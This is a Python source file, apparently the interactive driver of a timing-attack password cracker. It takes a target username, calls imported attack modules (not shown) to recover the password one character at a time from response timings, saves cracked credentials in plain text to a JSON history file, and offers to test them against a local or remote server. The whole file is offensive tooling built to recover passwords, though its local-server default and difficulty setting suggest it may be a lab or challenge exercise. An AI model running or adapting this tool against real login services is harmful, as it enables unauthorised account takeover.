import sys
import os
import time
import json
from datetime import datetime
from pathlib import Path
import yaml
from dotenv import load_dotenv

from core.exceptions import TimingAttackException, ConfigurationError
from services.http_service import HttpClient
from services.analysis_service import AnalysisService
from services.timing_service import TimingService, SamplingStrategy
from attack.timing_attacker import TimingAttacker, AttackConfig
from utils.logger import Logger


RESULTS_FILE = "attack_results.json"


def load_config(config_path: str = "config/config.yaml") -> dict:
    try:
        with open(config_path, 'r') as f:
            return yaml.safe_load(f)
    except FileNotFoundError:
        raise ConfigurationError(f"Config file not found: {config_path}")
    except yaml.YAMLError as e:
        raise ConfigurationError(f"Invalid YAML config: {str(e)}")


def save_result(username: str, password: str, elapsed_time: float, difficulty: int):
    results = load_results()
    results.append({
        "username": username,
        "password": password,
        "time_seconds": round(elapsed_time, 2),
        "difficulty": difficulty,
        "timestamp": datetime.now().isoformat(),
        "length": len(password)
    })

    with open(RESULTS_FILE, 'w') as f:
        json.dump(results, f, indent=2)


def load_results():
    if not Path(RESULTS_FILE).exists():
        return []
    try:
        with open(RESULTS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []


def test_password(http_client: HttpClient, username: str, password: str, difficulty: int):
    print(f"\n{'='*60}")
    print("Testing Password")
    print(f"{'='*60}")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print(f"Difficulty: {difficulty}")
    print("\nSending request...")

    measurement = http_client.send_request(password, username, difficulty)

    print(f"\n{'='*60}")
    if measurement.is_correct:
        print("[+] SUCCESS - Password is correct!")
    else:
        print("✗ FAILED - Password is incorrect")
    print(f"Response time: {measurement.elapsed_time:.3f}s")
    print(f"{'='*60}\n")

    return measurement.is_correct


def view_history():
    results = load_results()

    print(f"\n{'='*60}")
    print("Attack History")
    print(f"{'='*60}\n")

    if not results:
        print("No previous attacks found.\n")
        return

    for i, result in enumerate(results, 1):
        timestamp = datetime.fromisoformat(result['timestamp']).strftime("%Y-%m-%d %H:%M:%S")
        print(f"{i}. [{timestamp}]")
        print(f"   User: {result['username']}")
        print(f"   Password: {result['password']} ({result['length']} chars)")
        print(f"   Time: {result['time_seconds']}s | Difficulty: {result['difficulty']}")
        print()


def run_attack(config: dict, logger: Logger):
    username = os.environ.get('TARGET_USERNAME')
    if not username:
        username = input("Enter target username: ").strip()
        if not username:
            print("Username required!")
            return

    difficulty = int(os.environ.get('ATTACK_DIFFICULTY', config['attack']['difficulty']))
    max_length = int(os.environ.get('MAX_PASSWORD_LENGTH', config['attack']['max_password_length']))

    print(f"\n{'='*60}")
    print("Starting Timing Attack")
    print(f"{'='*60}")
    print(f"Target: {username}")
    print(f"Difficulty: {difficulty}")
    print(f"Max Length: {max_length}")
    print(f"{'='*60}\n")

    # Determine server URL
    use_local = os.environ.get('USE_LOCAL_SERVER', 'true').lower() == 'true'
    base_url = config['server']['base_url'] if use_local else config['server']['remote_url']

    logger.info(f"Server: {base_url}")

    # Initialize components
    http_client = HttpClient(
        base_url=base_url,
        timeout=config['server']['timeout'],
        max_retries=config['server']['max_retries'],
        pool_size=config['performance']['pool_size'],
        logger=logger
    )

    timing_analyzer = AnalysisService(
        confidence_level=config['attack']['thresholds']['confidence_level'],
        min_time_difference=config['attack']['thresholds']['min_time_difference'],
        outlier_threshold=config['attack']['thresholds']['outlier_std_dev'],
        logger=logger
    )

    sampling_strategy = SamplingStrategy(
        initial_samples=config['attack']['timing']['initial_samples'],
        middle_samples=config['attack']['timing']['middle_samples'],
        final_samples=config['attack']['timing']['final_samples'],
        min_samples=config['attack']['timing']['min_samples']
    )

    timing_service = TimingService(
        http_client=http_client,
        sampling_strategy=sampling_strategy,
        logger=logger,
        use_parallel=config['performance']['parallel_requests'],
        max_workers=config['performance']['max_workers']
    )

    attack_config = AttackConfig(
        charset=config['attack']['charset'],
        max_length=max_length,
        verify_each_char=True
    )

    attacker = TimingAttacker(
        http_client=http_client,
        timing_analyzer=timing_analyzer,
        timing_service=timing_service,
        config=attack_config,
        logger=logger
    )

    # Execute attack
    start_time = time.time()
    password = attacker.crack_password(username=username, difficulty=difficulty, max_length=max_length)
    elapsed_time = time.time() - start_time

    # Save result
    save_result(username, password, elapsed_time, difficulty)

    # Display result
    print(f"\n{'='*60}")
    print("[+] ATTACK COMPLETE")
    print(f"{'='*60}")
    print(f"Password: {password}")
    print(f"Length: {len(password)} characters")
    print(f"Time: {elapsed_time:.2f} seconds ({elapsed_time/60:.1f} minutes)")
    print(f"{'='*60}\n")

    http_client.close()

    # Ask if user wants to test it
    test = input("Test this password against server? (y/n): ").strip().lower()
    if test == 'y':
        # Reinitialize client
        http_client = HttpClient(base_url=base_url, timeout=10, max_retries=3, pool_size=10, logger=logger)
        test_password(http_client, username, password, difficulty)
        http_client.close()


def test_password_menu(config: dict, logger: Logger):
    username = input("\nEnter username: ").strip()
    password = input("Enter password to test: ").strip()
    difficulty = input(f"Enter difficulty (default={config['attack']['difficulty']}): ").strip()

    if not difficulty:
        difficulty = config['attack']['difficulty']
    else:
        difficulty = int(difficulty)

    # Determine server URL
    use_local = os.environ.get('USE_LOCAL_SERVER', 'true').lower() == 'true'
    base_url = config['server']['base_url'] if use_local else config['server']['remote_url']

    http_client = HttpClient(base_url=base_url, timeout=10, max_retries=3, pool_size=10, logger=logger)
    test_password(http_client, username, password, difficulty)
    http_client.close()


def show_menu():
    print(f"\n{'='*60}")
    print("TIMING ATTACK - INTERACTIVE MENU")
    print(f"{'='*60}")
    print("1. Start New Attack")
    print("2. View Attack History")
    print("3. Test Password")
    print("4. Exit")
    print(f"{'='*60}")


def main():
    load_dotenv()

    try:
        config = load_config()
        logger = Logger(
            name="TimingAttack",
            level=os.environ.get('LOG_LEVEL', config['logging']['level']),
            log_file=config['logging'].get('file'),
            console=config['logging']['console']
        )

        while True:
            show_menu()
            choice = input("\nSelect option (1-4): ").strip()

            if choice == '1':
                run_attack(config, logger)
            elif choice == '2':
                view_history()
            elif choice == '3':
                test_password_menu(config, logger)
            elif choice == '4':
                print("\nExiting...\n")
                break
            else:
                print("\nInvalid option! Please select 1-4.")

        return 0

    except ConfigurationError as e:
        print(f"Configuration error: {str(e)}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("\n\nExiting...\n")
        return 0
    except Exception as e:
        print(f"Unexpected error: {str(e)}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 3


if __name__ == "__main__":
    sys.exit(main())
